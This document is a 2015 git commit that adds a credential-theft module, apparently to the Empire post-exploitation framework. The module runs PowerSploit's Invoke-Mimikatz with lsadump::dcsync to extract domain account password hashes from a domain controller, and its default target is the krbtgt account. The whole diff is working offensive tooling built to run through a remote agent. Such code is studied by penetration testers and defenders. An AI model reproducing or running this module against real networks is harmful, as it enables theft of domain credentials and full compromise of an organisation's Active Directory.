be637dd38afcc221718f7e6562f8412ec56b226f
Harmj0y <will@harmj0y.net>
2015-08-24 01:28:11 -0400

    Updated .dll for Invoke-Mimikatz, including lsadump::dcsync functionality.

---
+++ lib/modules/credentials/mimikatz/dcsync.py
@@ -0,0 +1,83 @@
+from lib.common import helpers
+
+class Module:
+
+    def __init__(self, mainMenu, params=[]):
+
+        self.info = {
+            'Name': 'Invoke-Mimikatz DCsync',
+
+            'Author': ['@gentilkiwi', '@JosephBialek'],
+
+            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
+                            "to extract a given account password through "
+                            "Mimikatz's lsadump::dcsync module. This doesn't "
+                            "need code execution on a given DC, but needs to be "
+                            "run from a user context with DA equivalent privileges."),
+
+            'Background' : True,
+
+            'OutputExtension' : None,
+            
+            'NeedsAdmin' : True,
+
+            'OpsecSafe' : True,
+
+            'MinPSVersion' : '2',
+            
+            'Comments': [
+                'http://blog.gentilkiwi.com',
+                'http://clymb3r.wordpress.com/'
+            ]
+        }
+
+        # any options needed by the module, settable during runtime
+        self.options = {
+            # format:
+            #   value_name : {description, required, default_value}
+            'Agent' : {
+                'Description'   :   'Agent to run module on.',
+                'Required'      :   True,
+                'Value'         :   ''
+            },
+            'Username' : {
+                'Description'   :   'Username to extract the hash for, blank for all local passwords.',
+                'Required'      :   True,
+                'Value'         :   'krbtgt'
+            }
+        }
+
+        # save off a copy of the mainMenu object to access external functionality
+        #   like listeners/agent handlers/etc.
+        self.mainMenu = mainMenu
+        
+        for param in params:
+            # parameter format is [Name, Value]
+            option, value = param
+            if option in self.options:
+                self.options[option]['Value'] = value
+
+
+    def generate(self):
+        
+        # read in the common module source code
+        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-Mimikatz.ps1"
+
+        try:
+            f = open(moduleSource, 'r')
+        except:
+            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            return ""
+
+        moduleCode = f.read()
+        f.close()
+
+        script = moduleCode
+
+        script += "Invoke-Mimikatz -Command "
+
+        script += "'\"lsadump::dcsync /user:" + self.options['Username']['Value']
+
+        script += "\"';"
+
+        return script
